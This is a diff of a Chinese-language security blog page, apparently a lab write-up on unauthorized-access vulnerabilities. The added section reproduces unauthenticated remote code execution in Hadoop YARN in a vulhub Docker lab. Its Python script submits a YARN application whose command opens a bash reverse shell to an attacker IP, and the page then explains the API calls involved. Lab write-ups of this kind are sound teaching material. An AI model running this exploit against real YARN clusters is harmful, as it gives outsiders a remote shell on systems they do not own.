@@ -37,8 +37,9 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240112200210287.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240112200620667.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240112211452585.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240113092016975.png">
 <meta property="article:published_time" content="2024-01-11T02:01:44.000Z">
-<meta property="article:modified_time" content="2024-01-12T13:49:53.272Z">
+<meta property="article:modified_time" content="2024-01-13T02:15:00.210Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -242,7 +243,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.2k words
+          5.4k words
         
       </span>
     
@@ -253,7 +254,7 @@
         
         
         
-          35 mins
+          45 mins
         
       </span>
     
@@ -322,7 +323,7 @@
 </li>
 <li><p>探测</p>
 <p>使用nmap进行端口扫描</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -v -Pn -p <span class="hljs-number">6379</span> -sV -IP<br><br></code></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -v -Pn -p <span class="hljs-number">6379</span> -sV -IP<br></code></pre></td></tr></table></figure>
 
 <blockquote>
 <p>-v 显示过程</p>
@@ -507,6 +508,26 @@
 <h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">version: <span class="hljs-string">&#x27;2&#x27;</span><br><br>services:<br>  namenode:<br>    image: vulhub/hadoop:<span class="hljs-number">2.8</span>.<span class="hljs-number">1</span><br>    environment:<br>      - HDFS_CONF_dfs_namenode_name_dir=file:///hadoop/dfs/name<br>      - CLUSTER_NAME=vulhub<br>      - HDFS_CONF_dfs_replication=<span class="hljs-number">1</span><br>    command: /namenode.sh<br><br>  datanode:<br>    image: vulhub/hadoop:<span class="hljs-number">2.8</span>.<span class="hljs-number">1</span><br>    environment:<br>      - HDFS_CONF_dfs_datanode_data_dir=file:///hadoop/dfs/data<br>      - CORE_CONF_fs_defaultFS=hdfs://namenode:<span class="hljs-number">8020</span><br>      - CLUSTER_NAME=vulhub<br>      - HDFS_CONF_dfs_replication=<span class="hljs-number">1</span><br>    command: /datanode.sh<br><br>  resourcemanager:<br>    image: vulhub/hadoop:<span class="hljs-number">2.8</span>.<span class="hljs-number">1</span><br>    environment:<br>      - CORE_CONF_fs_defaultFS=hdfs://namenode:<span class="hljs-number">8020</span><br>      - YARN_CONF_yarn_log___aggregation___enable=true<br>    command: /resourcemanager.sh<br>    ports:<br>      - <span class="hljs-string">&quot;8088:8088&quot;</span><br><br>  nodemanager:<br>    image: vulhub/hadoop:<span class="hljs-number">2.8</span>.<span class="hljs-number">1</span><br>    environment:<br>      - CORE_CONF_fs_defaultFS=hdfs://namenode:<span class="hljs-number">8020</span><br>      - YARN_CONF_yarn_resourcemanager_hostname=resourcemanager<br>      - YARN_CONF_yarn_log___aggregation___enable=true<br>      - YARN_CONF_yarn_nodemanager_remote___app___log___dir=/app-logs<br>    command: /nodemanager.sh<br></code></pre></td></tr></table></figure>
 
 
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># 漏洞目标 URL</span><br>target = <span class="hljs-string">&#x27;http://192.168.81.127:8088/&#x27;</span><br><span class="hljs-comment"># 反弹Shell 攻击机IP地址</span><br>lhost = <span class="hljs-string">&#x27;192.168.81.238&#x27;</span><br><br>url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;target&#125;</span>ws/v1/cluster/apps/new-application&#x27;</span><br>resp = requests.post(url).content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>resp_json = json.loads(resp)<br><br>app_id = resp_json[<span class="hljs-string">&#x27;application-id&#x27;</span>]<br>url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;target&#125;</span>ws/v1/cluster/apps&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;application-id&#x27;</span>: app_id,<br>    <span class="hljs-string">&#x27;application-name&#x27;</span>: <span class="hljs-string">&#x27;get-shell&#x27;</span>,<br>    <span class="hljs-string">&#x27;am-container-spec&#x27;</span>: &#123;<br>        <span class="hljs-string">&#x27;commands&#x27;</span>: &#123;<span class="hljs-string">&#x27;command&#x27;</span>: <span class="hljs-string">f&#x27;/bin/bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">&#123;lhost&#125;</span>/5566 0&gt;&amp;1&#x27;</span>&#125;<br>    &#125;,<br>    <span class="hljs-string">&#x27;application-type&#x27;</span>: <span class="hljs-string">&#x27;YARN&#x27;</span>,<br>&#125;<br>requests.post(url, json=data)<br></code></pre></td></tr></table></figure>
+
+<p>注意这个攻击机得监听着，不然反弹不了shell</p>
+<p>接下来我们来实操一下</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240113092016975.png" srcset="/img/loading.gif" lazyload alt="image-20240113092016975"></p>
+<p>启动一下docker</p>
+<p>然后执行上面的代码就可以了</p>
+<p>原理：</p>
+<ol>
+<li>调用 New Application API 创建 Application</li>
+</ol>
+   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">NewApplication</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">application-id</span>&gt;</span>application_1688957760252_0004<span class="hljs-tag">&lt;/<span class="hljs-name">application-id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">maximum-resource-capability</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">memory</span>&gt;</span>8192<span class="hljs-tag">&lt;/<span class="hljs-name">memory</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">vCores</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">vCores</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">maximum-resource-capability</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">NewApplication</span>&gt;</span><br>   <br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>调用 Submit Application API 提交命令</p>
+<p>  POST请求 <a target="_blank" rel="noopener" href="http://ip:8088/ws/v1/cluster/apps%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">http://ip:8088/ws/v1/cluster/apps，提交执行命令</a></p>
+</li>
+</ol>
+<h2 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h2>
                 
               </div>
             
